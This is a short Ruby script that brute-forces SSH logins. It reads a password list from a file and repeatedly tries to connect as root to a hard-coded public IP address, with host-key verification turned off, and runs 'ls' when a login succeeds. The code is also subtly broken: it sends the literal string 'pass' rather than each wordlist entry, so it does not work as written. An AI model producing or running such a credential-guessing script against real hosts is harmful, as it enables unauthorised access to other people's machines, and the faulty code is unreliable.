require 'rubygems'
require 'net/ssh'

passes = []

File.open(ARGV[0]) { |fd| passes = fd.read.split }

until passes.empty?
  pass = passes.shift
  begin
    ssh = Net::SSH.start('185.123.188.210', 'root', password: 'pass', verify_host_key: :never, :non_interactive => true)
    puts ssh.exec!('ls')
    ssh.close
  rescue Net::SSH::AuthenticationFailed
    puts 'pass'
  end
end
